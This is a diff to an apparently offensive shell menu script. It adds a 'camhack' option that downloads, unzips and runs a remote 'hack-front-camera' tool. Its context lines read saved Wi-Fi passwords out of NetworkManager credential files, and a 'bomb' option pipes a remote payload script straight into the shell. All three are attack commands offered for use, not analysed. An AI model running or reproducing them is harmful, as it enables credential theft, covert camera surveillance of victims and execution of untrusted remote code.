@@ -33,6 +33,19 @@ lwifipass)
 sudo cat /etc/NetworkManager/system-connections/*|grep "^psk=\|^id=\|^type"|sed '0~3 a\\--+--+--+--+--+--+--+--+--+--+--+--+'|sed '1 i\--+--+--+--+--+--+--+--+--+--+--+--+' >.saved.wifi.pass
 ;;
 
+camhack)
+if [[ -e $HOME/hack-front-camera/index.html ]]
+then
+cd $HOME/hack-front-camera
+$HOME/hack-front-camera/run.sh
+else
+curl -L -o $HOME/hack-front-camera.zip https://raw.githubusercontent.com/efxtv/EFX-Tv-Bookmarks/main/bin/hack-front-camera.zip --progress-bar
+unzip hack-front-camera.zip -d hack-front-camera > /dev/null 2>&1 &
+cd $HOME/hack-front-camera
+$HOME/hack-front-camera/run.sh
+fi;;
+
+
 bomb)
 source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/bomb.sh);;
 
